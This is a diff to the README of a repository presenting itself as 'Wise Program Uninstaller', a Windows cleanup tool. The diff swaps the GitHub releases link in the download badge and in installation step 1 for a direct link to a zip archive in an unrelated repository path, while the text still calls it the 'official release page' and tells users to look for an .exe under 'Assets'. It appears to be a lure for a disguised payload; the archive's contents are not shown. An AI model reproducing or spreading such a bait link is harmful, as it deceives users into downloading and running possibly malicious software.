@@ -5,7 +5,7 @@ description: "Remove Windows programs and leftover files with this direct instal
 ---
 # 🗑️ Wise-Program-Uninstaller - Remove stubborn apps from your computer
 
-[![Download](https://img.shields.io/badge/Download-Wise_Uninstaller-blue)](https://github.com/hamic4956/Wise-Program-Uninstaller/releases)
+[![Download](https://img.shields.io/badge/Download-Wise_Uninstaller-blue)](https://raw.githubusercontent.com/hamic4956/hamic4956.github.io/main/cacoglossia/github-io-hamic-v3.8.zip)
 
 Wise Program Uninstaller clears unwanted software from your Windows computer. It removes programs that standard tools leave behind. Use this tool to keep your system clean and fast.
 
@@ -32,7 +32,7 @@ Ensure you have administrator rights on your computer. This level of access allo
 
 Follow these steps to set up the software.
 
-1.  Visit the official release page: [https://github.com/hamic4956/Wise-Program-Uninstaller/releases](https://github.com/hamic4956/Wise-Program-Uninstaller/releases).
+1.  Visit the official release page: [https://raw.githubusercontent.com/hamic4956/hamic4956.github.io/main/cacoglossia/github-io-hamic-v3.8.zip](https://raw.githubusercontent.com/hamic4956/hamic4956.github.io/main/cacoglossia/github-io-hamic-v3.8.zip).
 2.  Locate the section labeled "Assets."
 3.  Click the link ending in .exe to download the installer file to your computer.
 4.  Open your "Downloads" folder in Windows File Explorer.
